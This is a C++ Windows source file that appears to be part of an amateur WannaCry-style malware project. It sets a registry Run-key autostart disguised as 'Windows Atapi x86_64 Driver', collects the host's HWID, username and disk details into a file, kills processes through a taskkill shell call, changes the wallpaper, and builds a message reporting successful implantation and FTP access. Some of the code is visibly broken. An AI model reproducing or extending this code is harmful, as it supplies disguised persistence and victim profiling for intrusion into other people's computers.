#include "include/API.h"
#include "include/API-2.h"

ofstream ofs;
ifstream ifs;

string wstring2string(wstring wstr)
{
    string result;
    //获取缓冲区大小，并申请空间，缓冲区大小事按字节计算的  
    int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), NULL, 0, NULL, NULL);
    char* buffer = new char[len + 1];
    //宽字节编码转换成多字节编码  
    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), buffer, len, NULL, NULL);
    buffer[len] = '\0';
    //删除缓冲区并返回值  
    result.append(buffer);
    delete[] buffer;
    return result;
}


//更改系统桌面
void system_information_table() {
    const char* path = "C:\\Users\\ASUS\\Pictures\\CG\\WannaCry复现.jpg";
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_SENDCHANGE);
}


string text_box_auto() {
    string email_text_book = "成功植入宿主机";
    string email_text_neirong = "FTP可随时开启服务！";
    return email_text_book+email_text_neirong;
}


 
 string HWID = GetHWID();   //HWID
 string windows_user = windows_username();      //username
 string system_box = system_information();          //disk
 string system_text = system_information_text();    //filetype



void fstream_double() {
	ofs.open("C:\\Windows sys\\computer_box.txt", ios::out);
	ofs << "计算机用户名称:" <<windows_username<< endl;
    ofs << "设备HWID:" << HWID << endl;
    ofs << "磁盘名称:" <<system_box <<endl;
    ofs << "文件系统：" <<system_text<< endl;
}


//开机自启动
string userlc;
//开机自启动
void AutoStart()
{
    
    char Driver[MAX_PATH];
    HKEY hKey;
    string userlc = _pgmptr;
    string exe_name = "E-mail_text_false.exe";
    string ff_path = userlc + exe_name;
    cout << ff_path << endl;
    strcpy(Driver, ff_path.c_str());
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
    RegCloseKey(hKey);
}

//exepath
void exe_path() {
    cout << _pgmptr << endl;
}


//kill pro
void kill_process(string kill_name) {
    char kali_name=0;
    kill_name = kali_name;
    char message[1000];
    memset(message, 0, 200);
    char kill_target[] = "taskklii /f /t /im %c";
    sprintf_s(message, kill_target, kali_name);
    system(message);
}

//ifstream_open_read
void ifsteam_open_read() {
    ifs.open("C:\\Windows sys\\computer_box.txt", ios::in);
    if (!ifs.is_open())
    {
        cout << "文件打开失败" << endl;
        return;
    }
    char c;
    while ((c = ifs.get()) != EOF)
    {
        cout << c;
    }
    ifs.close();
}

//GetVolumelnformation全局参数




void c_box_information() {
    TCHAR szvolumename[260] = { 0 };
    DWORD dwvolumeserialnumber = 0;
    DWORD dwmaxvolumename = 0;
    DWORD dwfilesystemflgs = 0;
    TCHAR szfilesystemname[260] = { 0 };
    GetVolumeInformation(_T("C:\\"), szvolumename, 260, &dwvolumeserialnumber, &dwmaxvolumename, &dwfilesystemflgs, szfilesystemname, 260);
    //printf("卷标名称：%s\n卷标序列号：%x\n文件名称最大长度：%d\n文件系统标识：%x\n文件系统名称:%s",
    //    szvolumename, dwvolumeserialnumber, dwmaxvolumename, dwfilesystemflgs, szfilesystemname);
    cout << "卷标名称："<< szvolumename <<endl;
    cout << "卷标序列号：" << dwvolumeserialnumber << endl;
    cout << "文件名称最大长度：" << dwmaxvolumename << endl;
    cout << "文件系统标识：" << dwfilesystemflgs << endl;
    cout << "文件系统名称" << szfilesystemname << endl;

   /* TCHAR VolumeNameBuffer[MAX_PATH + 1], FileSystemNameBuffer[MAX_PATH];
    DWORD VolumeSerialNumber, MaximumComponentLength, FileSystemFlags;
    GetVolumeInformation(_T("C:\\"), VolumeNameBuffer, MAX_PATH + 1, &VolumeSerialNumber, &MaximumComponentLength, &FileSystemFlags, FileSystemNameBuffer, MAX_PATH + 1);*/
    
}
   
//system_dike_name

string system_information() {
    char szVolumeNameBuf[MAX_PATH] = { 0 };
    DWORD dwVolumeSerialNum;
    DWORD dwMaxComponentLength;
    DWORD dwSysFlags;
    char szFileSystemBuf[MAX_PATH] = { 0 };
    DWORD dwFileSystemBuf = MAX_PATH;

    BOOL bGet = GetVolumeInformationA("C:\\",
        szVolumeNameBuf,
        MAX_PATH,
        &dwVolumeSerialNum,
        &dwMaxComponentLength,
        &dwSysFlags,
        szFileSystemBuf,
        MAX_PATH);
    return szVolumeNameBuf;
}

string system_information_text() {
    char szVolumeNameBuf[MAX_PATH] = { 0 };
    DWORD dwVolumeSerialNum;
    DWORD dwMaxComponentLength;
    DWORD dwSysFlags;
    char szFileSystemBuf[MAX_PATH] = { 0 };
    DWORD dwFileSystemBuf = MAX_PATH;

    BOOL bGet = GetVolumeInformationA("C:\\",
        szVolumeNameBuf,
        MAX_PATH,
        &dwVolumeSerialNum,
        &dwMaxComponentLength,
        &dwSysFlags,
        szFileSystemBuf,
        MAX_PATH);
    return szFileSystemBuf;
}

